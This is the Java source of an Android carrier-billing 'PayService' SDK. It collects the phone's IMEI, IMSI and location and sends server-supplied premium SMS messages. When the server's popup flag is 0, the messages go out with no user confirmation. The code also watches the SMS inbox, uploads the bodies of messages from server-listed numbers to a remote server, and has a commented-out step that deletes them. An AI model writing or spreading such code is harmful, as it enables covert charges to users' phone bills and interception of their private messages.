package com.hh.sdk.service;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.PendingIntent;
import android.content.*;
import android.content.DialogInterface.OnClickListener;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;
import com.hh.sdk.api.IntercepteApi;
import com.hh.sdk.api.RequestPayApi;
import com.hh.sdk.api.SMSSendStatusApi;
import com.hh.sdk.model.SMSSendModel;
import com.hh.sdk.net.JsonResponse;
import com.hh.sdk.net.NetTask;
import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.Queue;
import java.util.concurrent.LinkedBlockingQueue;

public class PayService {
    private Activity mActivity;
    private Handler mHandler = new Handler();
    public static final String SMSID = "smsId";
    private final String SEND_MESSAGE_ACTION = "com.zhidian.paymessage";
    private static PayService instance;
    private double latitued;
    private double longtitued;
    private String imsi;
    private String imei;
    private int money;
    public int timeInterval = 0;
    private boolean hasCallback = false;
    private long lastPayTime = -1;
    private IPayListener mPayListener;
    private List<String> mInterceptPhone = new ArrayList<String>();
    private Queue<SMSSendModel> smsIdQueue = new LinkedBlockingQueue<SMSSendModel>();
    private Queue<SMSSendModel> sendSmsIdQueue = new LinkedBlockingQueue<SMSSendModel>();
    private String orderId  ;
    public void setLatitued(double latitued) {
        this.latitued = latitued;
    }

    public void setLongtitued(double longtitued) {
        this.longtitued = longtitued;
    }

    public interface IPayListener {
        /**
         * @param money 冲值金额 单位为分
         */
        public void paySuccess(int money);

        public void payCancel(int money);

        public void payFail(int money);
    }

    public static PayService getInstance(Activity activity) {
        if (instance == null) {
            instance = new PayService(activity);
        }
        return instance;
    }

    private PayService(Activity activity) {
        this.mActivity = activity;
        mActivity.registerReceiver(mSendReceiver, new IntentFilter(SEND_MESSAGE_ACTION));
        mActivity.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, mObserver);
    }

    public void requestPay(int money, String imei, String imsi,
                           String region, IPayListener listener) {
        if (canPay()) {
            mInterceptPhone.clear();
            sendSmsIdQueue.clear();
            hasCallback = false;
            this.mPayListener = listener;
            this.imei = imei;
            this.imsi = imsi;
            this.money = money;
            RequestPayApi requestPayApi = new RequestPayApi();
            requestPayApi.gameId= getMeteDate(mActivity, "zmappid");
            requestPayApi.channelId = getMeteDate(mActivity,"zmchanelId");
            requestPayApi.imei = imei;
            requestPayApi.imsi = imsi;
            requestPayApi.money = money;
            requestPayApi.region = null;
            requestPayApi.latitude = latitued + "";
            requestPayApi.longitude = longtitued + "";
            requestPayApi.setResponse(response);
            new NetTask().execute(requestPayApi);
        } else {
            Toast.makeText(mActivity, "间隔时间太短不能支付", Toast.LENGTH_SHORT).show();
        }
    }

    private boolean canPay() {
        if (lastPayTime == -1 || timeInterval == 0) {
            return true;
        }
        long now = System.currentTimeMillis();
        if (now - lastPayTime > timeInterval * 1000) {
            return true;
        }

        return false;
    }

    BroadcastReceiver mSendReceiver = new BroadcastReceiver() {

        @Override
        public void onReceive(Context context, Intent intent) {
            switch (getResultCode()) {
                case Activity.RESULT_OK:
                    Log.e("", "短信发送成功");
                    notifyMessage(sendSmsIdQueue.poll(), 0);
                    break;
                case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                case SmsManager.RESULT_ERROR_NO_SERVICE:
                case SmsManager.RESULT_ERROR_NULL_PDU:
                case SmsManager.RESULT_ERROR_RADIO_OFF:
                default:
                    Log.e("", "短信发送失败");
                    Toast.makeText(mActivity.getApplicationContext(),
                            "发送短信失败，充值不成功", Toast.LENGTH_SHORT).show();
                    notifyMessage(sendSmsIdQueue.poll(), 1);
                    break;
            }
        }
    };
   private JsonResponse response = new JsonResponse() {

        @Override
        public void requestSuccess(JSONObject jsonObject) {
            try {
                JSONObject json = jsonObject;
                int code = json.getInt("code");
                if (code == 0) {
                    lastPayTime = System.currentTimeMillis();
                    JSONObject data = json.getJSONObject("data");
                    int status = data.getInt("status");
                    if (status == 0) {
                        timeInterval = data.optInt("timeInterval");
//                        final String packageName = data
//                                .getString("packageName");
//                        Log.e("", packageName + " =========== " + mActivity.getPackageName());//FIXME
                        int popup = data.getInt("popup");
                        Log.e("", " popup===== " + popup);//FIXME

                        final List<SMSSendModel> smsSendModelList = new ArrayList<SMSSendModel>();
                        final List<String> interceptPorts = new ArrayList<String>();
                        JSONArray array = data
                                .getJSONArray("smsList");
                        for (int i = 0; i < array.length(); i++) {
                            JSONObject smsJson = array.getJSONObject(i);
                            SMSSendModel smsSendModel = new SMSSendModel();
                            smsSendModel.smsId = smsJson.optString("smsId");
                            smsSendModel.orderId = smsJson.optString("orderId") ;
                            smsSendModel.port = smsJson.optString("port");
                            smsSendModel.money = smsJson.optInt("money");
                            smsSendModel.regexp = smsJson.optString("regexp");
                            smsSendModel.sms = smsJson.optString("sms");
                            JSONArray intercepterArray = smsJson.getJSONArray("interceptPorts");
                            for (int j = 0; j < intercepterArray.length(); j++) {
                                mInterceptPhone.add(intercepterArray.getString(j));
                            }
                            smsSendModelList.add(smsSendModel);
                        }
                        if (popup == 0) {
                            for (SMSSendModel sms : smsSendModelList) {
                                sendSMS(sms);
                            }
                        } else {
                            new AlertDialog.Builder(mActivity)
                                    .setTitle("确定支付")
                                    .setMessage("您将通过话费进行支付")
                                    .setNegativeButton("取消",
                                            new OnClickListener() {

                                                @Override
                                                public void onClick(
                                                        DialogInterface dialog,
                                                        int which) {
                                                    dialog.cancel();
                                                    if (mPayListener != null) {
                                                        mPayListener.payCancel(money);
                                                    }
                                                }
                                            })
                                    .setPositiveButton("确定",
                                            new OnClickListener() {

                                                @Override
                                                public void onClick(
                                                        DialogInterface dialog,
                                                        int which) {
                                                    // 发送短信
                                                    for (SMSSendModel sms : smsSendModelList) {
                                                        sendSMS(sms);
                                                    }
                                                }
                                            }).create().show();
                        }

                    } else if (status == 1) {
                        Toast.makeText(mActivity,
                                "没有合适通道可用", Toast.LENGTH_SHORT).show();
                    } else if (status == 2) {
                        Toast.makeText(mActivity,
                                "用户已经列为黑名单", Toast.LENGTH_SHORT).show();
                    } else if (status == 3) {
                        Toast.makeText(
                                mActivity.getApplicationContext(),
                                "获取不到指令，支付失败", Toast.LENGTH_SHORT)
                                .show();
                    }
                } else if (code == 1) {
                    Toast.makeText(mActivity,
                            "参数不合法", Toast.LENGTH_SHORT).show();
                    mPayListener.payFail(money);
                } else if (code == 2) {
                    Toast.makeText(mActivity,
                            "服务器异常", Toast.LENGTH_SHORT).show();
                    mPayListener.payFail(money);
                }
            } catch (Exception e) {
                e.printStackTrace();
                mPayListener.payFail(money);
                Toast.makeText(mActivity.getApplicationContext(),
                        "无通道可用", Toast.LENGTH_SHORT).show();
            }
        }
    };

    /**
     * 发送短信
     * <p/>
     * 短信标识
     */

    private void sendSMS(final SMSSendModel model) {
        smsIdQueue.add(model);
        sendSmsIdQueue.add(model);
        mHandler.postDelayed(new Runnable() {

            @Override
            public void run() {
                Intent intent = new Intent(SEND_MESSAGE_ACTION);
                PendingIntent sentPI = PendingIntent.getBroadcast(mActivity, 0,
                        intent, 0);
                SmsManager manager = SmsManager.getDefault();
                Log.e("SendMessage", model.port+ "->" + model.sms);
                manager.sendTextMessage(model.port, null, model.sms, sentPI, null);
            }
        }, 100);
//        mHandler.postDelayed(new Runnable() {
//
//            @Override
//            public void run() {
//                if (smsSendStatus == -1) {
//                    sendErrorBroadcast("发送短信失败，充值不成功");
//                }
//            }
//        }, 30000);
    }

    public String getMeteDate(Context context, String key) {
        ApplicationInfo info;
        try {
            info = context.getPackageManager().getApplicationInfo(
                    context.getPackageName(), PackageManager.GET_META_DATA);
            String gameId = info.metaData.getString(key);
            if (gameId.startsWith(key + ":")) {
                gameId = gameId.split(":")[1];
            }
            return gameId;
        } catch (PackageManager.NameNotFoundException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        return null;
    }

    /**
     * 短信发送成功通知服务器
     *
     * @param status 失败重试次数
     */
    private void notifyMessage(final SMSSendModel model , final int status) {
        SMSSendStatusApi api = new SMSSendStatusApi();
        api.smsId = model.smsId;
        api.orderId = model.orderId ;
        api.status = status;
        api.setResponse(new JsonResponse());
        new NetTask().execute(api);
    }

    private void sendMessageToServer(SMSSendModel model, String sms, String port) {
        IntercepteApi intercepteApi = new IntercepteApi();
        intercepteApi.imei = imei;
        intercepteApi.imsi = imsi;
        intercepteApi.smsId = model.smsId;
        intercepteApi.sms = sms;
        intercepteApi.port = port;
        intercepteApi.orderId = model.orderId;
        intercepteApi.setResponse(new JsonResponse());
        new NetTask().execute(intercepteApi);
    }

    /**
     * 短信发送失败通知接口
     *
     * @param smsId 短信标识
     */
    private void notifyFail(final String smsId, final int status) {

    }


    /**
     * 反注册短信广播
     */
    private void unregisterSMSReceiver() {
        try {
            mActivity.unregisterReceiver(mSendReceiver);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onDestroy() {
        unregisterSMSReceiver();
    }

    ContentObserver mObserver = new ContentObserver(new Handler()) {

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            Log.e("PayService", "onChanged");
            ContentResolver resolver = mActivity.getContentResolver();
            Cursor cursor = resolver.query(Uri.parse("content://sms/inbox"), new String[]{"_id", "address", "body"}, null, null, "_id desc");
            long id = -1;

            if (cursor.getCount() > 0 && cursor.moveToFirst()) {
                id = cursor.getLong(0);
                String address = cursor.getString(1);
                String body = cursor.getString(2);
                if (mInterceptPhone.contains(address)) {
                    // 过滤短信
                    if (!hasCallback) {
                        hasCallback = true;
                        if (mPayListener != null) {
                            mPayListener.paySuccess(money);
                        }
                    }
                    Log.e("PayService","queue size->"+smsIdQueue.size());
                    sendMessageToServer(smsIdQueue.poll(), body, address);
//                    Toast.makeText(mActivity, String.format("address: %s\n body: %s", address, body), Toast.LENGTH_SHORT).show();
                }
            }
            cursor.close();

            if (id != -1) {
//                int count = resolver.delete(Telephony.Sms.CONTENT_URI, "_id=" + id, null);
//                Toast.makeText(mActivity, count == 1 ? "删除成功" : "删除失败", Toast.LENGTH_SHORT).show();
            }
        }

    };

}
